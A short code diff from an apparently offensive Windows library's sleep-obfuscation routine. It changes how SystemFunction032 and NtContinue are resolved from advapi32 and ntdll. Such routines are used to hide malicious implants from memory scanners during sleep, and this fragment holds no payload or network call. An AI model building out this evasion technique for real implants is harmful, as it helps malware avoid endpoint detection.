@@ -27,12 +27,12 @@ BOOL SleepObfuscationViaVirtualProtect(_In_ DWORD dwSleepTimeInMilliseconds, _In
 	if (hNtdll == NULL)
 		goto EXIT_ROUTINE;
 
-	hAdvapi32 = TryLoadDllMultiMethodW((PWCHAR)L"cryptsp.dll");
+	hAdvapi32 = TryLoadDllMultiMethodW((PWCHAR)L"advapi32.dll");
 	if (hAdvapi32 == NULL)
 		goto EXIT_ROUTINE;
 
 	NtContinue = (NTCONTINUE)GetProcAddressA((DWORD64)hNtdll, "NtContinue");
-	SystemFunction032 = (SYSTEMFUNCTION032)GetProcAddressA((DWORD64)hAdvapi32, "SystemFunction032");
+	SystemFunction032 = (SYSTEMFUNCTION032)GetProcAddressW((DWORD64)hAdvapi32, L"SystemFunction032");
 
 	if (!NtContinue || !SystemFunction032)
 		goto EXIT_ROUTINE;
